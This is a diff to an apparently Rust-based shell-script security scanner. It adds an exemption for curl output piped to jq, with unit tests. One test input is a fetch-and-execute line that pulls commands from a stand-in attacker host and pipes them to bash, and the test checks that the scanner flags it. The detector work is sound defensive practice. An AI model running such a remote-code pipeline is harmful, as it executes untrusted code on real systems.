@@ -874,6 +874,8 @@ fn check_url_patterns(
                 allowed_reason.get_or_insert(REASON_TRUSTED_HOST);
             } else if config.is_data_format_exempt(url) {
                 allowed_reason.get_or_insert("data format URL");
+            } else if audit_patterns::fetch_piped_to_jq(line) {
+                allowed_reason.get_or_insert("piped to jq");
             } else {
                 dangerous = true;
                 break;
@@ -1648,6 +1650,41 @@ more stuff
             &DEFAULT_CONFIG,
         );
         assert_eq!(c.findings.len(), 1);
+    }
+
+    #[test]
+    fn shell_scan_fetch_piped_to_jq_is_allowed_not_finding() {
+        // The crates.io registry query from bump-cargo-tools.yml: an
+        // extensionless JSON API piped to jq. Data, not code — no config needed.
+        let mut c = AuditCollector::new(true);
+        scan_shell_content(
+            r#"LATEST=$(curl -fsSL -H "$UA" "https://crates.io/api/v1/crates/${TOOL}" | jq -r '.crate.max_stable_version')"#,
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert!(c.findings.is_empty());
+        assert_eq!(c.allowed.len(), 1);
+        assert_eq!(c.allowed[0].reason, "piped to jq");
+    }
+
+    #[test]
+    fn shell_scan_fetch_to_jq_then_shell_is_still_pipe_to_shell() {
+        // jq anywhere in the pipeline must not downgrade a fetch that ends at a
+        // shell — pipe-to-shell pre-empts and fires its own finding.
+        let mut c = AuditCollector::new(false);
+        scan_shell_content(
+            "curl -fsSL https://evil.example/c | jq -r .cmd | bash",
+            "test.sh",
+            1,
+            "",
+            &mut c,
+            &DEFAULT_CONFIG,
+        );
+        assert_eq!(c.findings.len(), 1);
+        assert!(c.findings[0].description.contains("piped to shell"));
     }
 
     #[test]
